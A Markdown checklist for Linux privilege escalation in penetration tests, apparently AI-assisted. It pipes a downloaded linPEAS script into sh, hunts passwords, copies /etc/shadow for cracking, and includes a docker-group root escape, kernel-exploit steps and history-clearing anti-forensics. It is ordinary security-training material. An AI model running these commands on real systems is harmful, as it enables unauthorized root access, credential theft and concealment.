## Linux Priv-Esc Checklist
### 0 Preparation

- [ ] `whoami && id && hostname`    
- [ ] `uname -a && cat /etc/*-release`
- [ ] `script -q /tmp/loot.log -c bash` (start logging)
- [ ] Drop enumeration helpers (e.g. linPEAS) if permitted `curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` ([youtube.com](https://www.youtube.com/watch?v=GY7dtgDgDKg&utm_source=chatgpt.com "Linpeas For Linux Security - [ ]Lesson and Lab - [ ]YouTube"))
### 1 Baseline Enumeration

- [ ] `sudo -l` (check NOPASSWD or limited commands)    
- [ ] `ps auxf`, `ss -tulpn` (processes / listeners)
- [ ] `df -h && mount`, `fstab`, `lsblk` (file-systems)
- [ ] `crontab -l && ls -la /etc/cron.* /etc/at.*`
- [ ] `getcap -r / 2>/dev/null` (file capabilities)
- [ ] `find / -perm -4000 -type f -xdev 2>/dev/null` (SUID)
- [ ] `find / -writable -type d -xdev 2>/dev/null` (writable dirs)
### 2 Quick Wins via `sudo`

- [ ] If `NOPASSWD`: run command directly as root    
- [ ] If limited binary allowed, search on GTFOBins for privesc vector ([gtfobins.github.io](https://gtfobins.github.io/?utm_source=chatgpt.com "GTFOBins"))   e.g. `sudo <binary>` → shell escape
### 3 Credential & File Looting

- [ ] `grep -i -R "PASS\|PWD" /etc /var /home 2>/dev/null`    
- [ ] Inspect `/home/*/.ssh`, `.bash_history`, `.git-credentials`
- [ ] Check backups: `ls -la /var/backups/`, `*.bak`, `*.old`
- [ ] `cat /etc/shadow` (if readable) → crack offline
### 4 SUID / SGID Abuse

- [ ] Review each SUID/SGID binary on GTFOBins ([github.com](https://github.com/GTFOBins/GTFOBins.github.io?utm_source=chatgpt.com "GTFOBins is a curated list of Unix binaries that can be used ... - [ ]GitHub"))    
- [ ] Custom binaries → `strings`, `ltrace`, `gdb` to spot `system()`
- [ ] Copy binary to lab, test for argv/env escapes
### 5 File Capabilities

- [ ] Exploit `cap_setuid+ep`: `./binary` drops root shell    
- [ ] Abuse `cap_dac_read_search` to read `/etc/shadow`
- [ ] `cap_sys_module` → load unsigned kernel module
### 6 Cron / Timer Misconfig

- [ ] Writable script path or log→overwrite with payload    
- [ ] Wildcard injection: craft `--checkpoint` payload for `tar`, or `--exec` for `rsync`
### 7 PATH & Environment Hijacks

- [ ] Detect root-run scripts using relative paths    
- [ ] Place malicious binary in earlier-searched writable dir
- [ ] Leverage `LD_PRELOAD`, `LD_LIBRARY_PATH` when env not sanitized
### 8 Container & Service Abuse

- [ ] User in `docker` group → `docker run -v /:/mnt alpine chroot /mnt sh`    
- [ ] User in `lxd` group → `lxc init && lxc config device add` mount root
- [ ] Weak NFS exports (`no_root_squash`) → write to root FS
- [ ] Misconfigured Consul / Redis / PostgreSQL local sockets
### 9 Kernel & Local Exploits

- [ ] `uname -r` → map to CVEs (Dirty Pipe, Dirty COW, PwnKit)    
- [ ] Compile exploit locally (`gcc exploit.c -o sploit`)
- [ ] Run, then verify `id` shows `uid=0(root)`
### 10 Post-Escalation Actions

- [ ] Confirm root shell: `id`    
- [ ] `cp /etc/shadow /tmp && unshadow > /tmp/creds.txt`
- [ ] Add persistence only if assessment scope allows
- [ ] Clear bash history, revoke incriminating files
- [ ] Exit and archive `/tmp/loot.log` for reporting
